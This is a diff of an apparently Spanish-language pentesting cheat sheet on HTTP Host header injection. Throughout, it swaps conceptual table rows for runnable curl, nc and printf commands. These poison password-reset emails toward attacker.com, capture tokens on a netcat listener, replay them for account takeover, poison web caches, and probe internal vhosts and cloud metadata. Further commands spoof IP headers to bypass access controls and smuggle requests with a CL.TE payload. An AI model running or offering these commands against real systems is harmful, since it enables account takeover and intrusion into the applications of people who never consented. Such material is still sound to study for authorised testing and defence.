@@ -26,44 +26,35 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Stage 1: probe Host reflexion | Send normal reset → check email link | Recon. |
-| Stage 2: spoof Host | `POST /forgot` con `Host: attacker.com` | Inject. |
-| Stage 3: token captured | Victim recibe email con `https://attacker.com/reset?token=...` | Atacante log captures. |
-| Stage 4: replay token | Use token con legit Host: target.com | Reset password. |
-| Stage 5: ATO completo | Login con new password | Account takeover. |
-| Bypass de email security | Email no scaning link domain | Persistencia. |
-| Combine con DNS rebinding | If validation TOCTOU | Edge. |
-| Combine con XSS en email | Inject malicious link en email body | Multi-vector. |
-| Defender mitigations | Email scanning + signed tokens + URL constants | Standard. |
-| `X-Forwarded-Host` variant | Same flow con XFH header | Common bypass. |
-| Subdomain trust | `Host: attacker.target.com` (con takeover) | Trust transfer. |
-| Combine con Subdomain Takeover | Atacante owns subdomain → email link a real subdomain | High impact. |
+| `curl -X POST -H "Host: target.com" -H "X-Forwarded-Host: attacker.com" -d "email=victim@target.com" https://target.com/forgot` | Reset email link a attacker.com | Backend trusts XFH. |
+| `nc -lvnp 443` en attacker.com → recibir `GET /reset?token=...` | Listener captura token | Setup phishing. |
+| `curl https://target.com/reset?token=$STOLEN -d "password=ATK"` | Replay token contra legit endpoint | Final ATO step. |
+| `curl -X POST -H "X-Forwarded-Host: taken.target.com" -d "email=victim@target.com" https://target.com/forgot` | Subdomain takeover combo — link parece más legit | Wildcard cookie + SDT. |
+| `curl -X POST -H "Forwarded: host=attacker.com" -d "email=victim" https://target.com/forgot` | RFC 7239 Forwarded variant | Modern apps. |
+| `curl -X POST -H "X-Original-Host: attacker.com" -d "email=victim" https://target.com/forgot` | Custom override header | Per-app variants. |
+| `for h in 'X-Forwarded-Host' 'X-Host' 'X-Forwarded-Server' 'Forwarded'; do curl -X POST -H "Host: target.com" -H "$h: attacker.com" -d "email=victim@target.com" https://target.com/forgot; done` | Bulk header probe | Discovery automation. |
 ^hhi-chain-reset
 
-### Reset poisoning end-to-end PoC
+### Reset poisoning end-to-end
 
-```
-1. Atacante:
-POST /forgot HTTP/1.1
-Host: target.com
-X-Forwarded-Host: attacker.com
-Content-Type: application/x-www-form-urlencoded
+```bash
+# 1. Setup listener
+nc -lvnp 443
 
-email=victim@target.com
+# 2. Trigger reset poisoning
+curl -X POST -H "Host: target.com" -H "X-Forwarded-Host: attacker.com" \
+  -d "email=victim@target.com" https://target.com/forgot
 
-2. Backend genera reset link usando X-Forwarded-Host:
-"https://attacker.com/reset?token=eyJhbGc..."
+# 3. Email arrives a victim:
+# "Click to reset: https://attacker.com/reset?token=eyJ..."
 
-3. Email arrives a victim. Victim clicks (trusts apparent target.com email).
+# 4. Victim clicks → atacante recibe en listener:
+# GET /reset?token=eyJ...
 
-4. Browser fetches: https://attacker.com/reset?token=eyJhbGc...
-   Atacante logs request → tiene token.
+# 5. Atacante replay contra legit
+curl https://target.com/reset?token=eyJ... -d "password=ATTACKER_PASS"
 
-5. Atacante usa token contra REAL target:
-GET https://target.com/reset?token=eyJhbGc...
-→ App acepta token (token signed valid) → password reset complete.
-
-6. ATO complete.
+# 6. ATO complete — login con ATTACKER_PASS
 ```
 
 ___
@@ -72,17 +63,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | Host (or XFH) reflected en cached response → cache stores poisoned response → all users see poisoned content | Mass impact. |
-| `<base href>` poison | XFH attacker → page cached con `<base href="https://attacker">` | Asset rerouting masivo. |
-| Canonical link poison | Same mechanism con canonical | SEO impact. |
-| Cache TTL persistencia | Hours / days típicamente | Long-lasting. |
-| Open Redirect cache | `Location: https://${HOST}/login` cached | Mass phishing. |
-| `<link rel>` poison | CSS / JS source rerouted | Style hijack. |
-| Combine con Param Miner | Detect unkeyed Host inputs | Recon. |
-| Cache deception via Host | Path confusion + Host inject | Multi-vector. |
-| Multi-CDN tier | Each tier may differ → propagation | Compound. |
-| Edge node specific | Geographic poisoning | Per-region. |
-| Combine con HRS | Smuggle response with attacker Host cached | Critical chain. |
+| `curl -H "X-Forwarded-Host: attacker.com" "https://target.com/?cb=$(date +%s)"` | Pre-poison probe con cache bust | Pre-attack check. |
+| `curl -H "X-Forwarded-Host: attacker.com" https://target.com/login` (cache hit) | Cache stores `<base href="//attacker.com">` | Mass victim asset rerouting. |
+| `curl -sI -H "X-Forwarded-Host: x" https://target/x \| grep -iE 'cf-cache-status\|x-cache\|age:'` | Verificar cache hit post-injection | Cache confirmation. |
+| Burp → Param Miner → Right-click → "Guess headers" | Detecta unkeyed inputs | Discovery automation. |
+| `curl -H "X-Forwarded-Host: attacker.com" -H "Pragma: x-get-cache-key" https://target/?cb=$(date +%s)` | Cloudflare/Akamai cache key debug | Header-based debug. |
+| Post-poison: `curl https://target.com/login` (víctima común) → recibe response con attacker.com | Mass impact verification | Cache TTL window. |
+| `curl -sI -H "X-Forwarded-Host: attacker.com" https://target/feed.rss` | RSS feed self-link poison | Feed reader rerouting. |
 ^hhi-chain-cache
 
 ___
@@ -91,17 +78,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | Backend routes by Host. Internal vhosts not exposed externally. Atacante envía Host: internal-vhost → server respuesta con internal app | SSRF via routing. |
-| Internal admin | `Host: admin.internal.target` | Hidden admin panel. |
-| Internal API | `Host: api.internal` | Backend API. |
-| Internal monitoring | `Host: kibana.internal`, `prometheus.internal`, `grafana.internal` | Common stack. |
-| Internal CI/CD | `Host: jenkins.internal`, `gitlab.internal` | DevOps. |
-| Internal storage | `Host: minio.internal`, `s3.internal` | Storage. |
-| Cloud metadata bypass | Some setups route based on Host → reach metadata | Edge. |
-| Default vhost fallback | If unknown Host → default app served | Recon. |
-| Combine con DNS rebind | Resolve external first then internal | TOCTOU. |
-| Combine con SNI mismatch | TLS SNI vs Host header differential | Edge. |
-| Combine con HRS | Smuggle internal vhost requests | Compound. |
+| `curl -H "Host: admin.internal" https://target.com/` | Internal admin vhost expose | Server routes by Host. |
+| `curl -H "Host: api.internal" https://target.com/` | Internal API expose | Multi-vhost server. |
+| `curl -H "Host: jenkins.internal" https://target.com/` | Jenkins panel | Common DevOps tool. |
+| `curl -H "Host: gitlab.internal" https://target.com/` | GitLab via Host | Internal repo. |
+| `curl -H "Host: kibana.internal" https://target.com/` | Kibana via Host | ELK stack. |
+| `curl -H "Host: localhost" https://target.com/admin` | Localhost-trust admin bypass | Trust-based ACL. |
+| `for h in admin api jenkins gitlab kibana grafana prometheus minio s3 dev staging localhost 127.0.0.1; do curl -sI -H "Host: $h" https://target.com/ \| head -3; done` | Bulk internal vhost probe | Discovery. |
+| `curl -H "Host: 169.254.169.254" https://target.com/latest/meta-data/` | Cloud metadata routing | If routed by Host. |
 ^hhi-chain-ssrf
 
 ___
@@ -110,16 +94,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | App grants special trust based on Host or X-Forwarded-For. Atacante spoofs → bypass auth. | Trust-based bypass. |
-| Trusted Host bypass | App: "if Host == admin.internal, skip auth" → atacante spoofs | Direct ACL bypass. |
-| `X-Forwarded-For: 127.0.0.1` | Server trusts internal IP → atacante bypasses | Standard. |
-| Trusted subdomain | Internal-only subdomain has admin features | Spoof Host. |
-| Per-Host config differential | Auth strict en target.com, less en api.target.com | Differential. |
-| Cookie scoping abuse | If cookie set per Host, atacante's Host gets different cookie | Edge. |
-| OAuth client_id Host trust | OAuth IdP grants different scopes per Host | Federation bypass. |
-| Combine con Subdomain Takeover | Atacante controls subdomain → trusted | High impact. |
-| API key exempt internal | Skip API key for "internal" Hosts | Bypass. |
-| Force public Host trick | `Host: public.target` instead de internal | Edge. |
+| `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | IP allowlist bypass | App trusts XFF para internal access. |
+| `curl -H "X-Real-IP: 127.0.0.1" https://target.com/admin` | nginx-style IP bypass | nginx-fronted. |
+| `curl -H "Host: admin.internal" https://target.com/admin` | Trusted Host bypass auth | Internal Host = no auth. |
+| `curl -H "Cf-Connecting-IP: 127.0.0.1" https://target.com/admin` | Cloudflare IP spoof | CF no strip header. |
+| `curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target.com/admin` | Atlassian/Confluence CVE | Confluence apps. |
+| `curl -H "Host: target.com" -H "X-Forwarded-Host: admin.internal" https://target.com/admin` | XFH-based ACL bypass | Backend ACL on XFH. |
+| `for h in 'X-Forwarded-For' 'X-Real-IP' 'True-Client-IP' 'Cf-Connecting-IP' 'Cluster-Client-IP' 'X-Originating-IP'; do curl -sI -H "$h: 127.0.0.1" https://target.com/admin \| head -1; done` | Bulk IP-spoof header probe | Discovery. |
 ^hhi-chain-auth
 
 ___
@@ -128,16 +109,11 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | HRS allows smuggle second request. Smuggled request con malicious Host → bypass front validation. | Compound. |
-| Smuggle Host injection | Second request `Host: internal.target` smuggled | Reach internal vhost. |
-| Smuggle X-Forwarded-Host | Backend uses smuggled XFH | Cache poisoning combo. |
-| Smuggle bypass Host validation | Frontend validates Host, smuggled request bypasses | Multi-vector. |
-| Cache poisoning via smuggle | Smuggled response cached | Persistente. |
-| Authentication via smuggle | Internal auth bypass via routing | Privesc. |
-| Smuggled SSRF | Smuggle a internal Host → SSRF | Combo. |
-| Smuggled password reset | Smuggle reset request con attacker Host | ATO chain. |
-| Combine con HTTP/2 downgrade | H2 → H1 with smuggled Host | Modern chain. |
-| Multiple chained vectors | HHI + HRS + Cache + Subdomain TKO | High-impact compound. |
+| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal.target\r\n\r\n' \| ncat target 80` | CL.TE smuggle con Host injection en smuggled request | HRS + HHI. |
+| Burp HTTP Request Smuggler extension → "Detect" → choose CL.TE → modify smuggled Host | Auto-detect HRS + manual Host injection | Tooling. |
+| `curl --http2 ... -H ":authority: target.com" -H "Host: attacker.com"` (H2 → H1 downgrade) | H2 desync con :authority vs Host | Modern chain. |
+| Smuggle reset poisoning: `POST /forgot ...` con XFH attacker en smuggled | ATO via HRS + HHI | Compound chain. |
+| Smuggle cache poison: `GET / ...` con XFH attacker en smuggled → cached | Mass cache poison | Critical chain. |
 ^hhi-chain-hrs
 
 ***
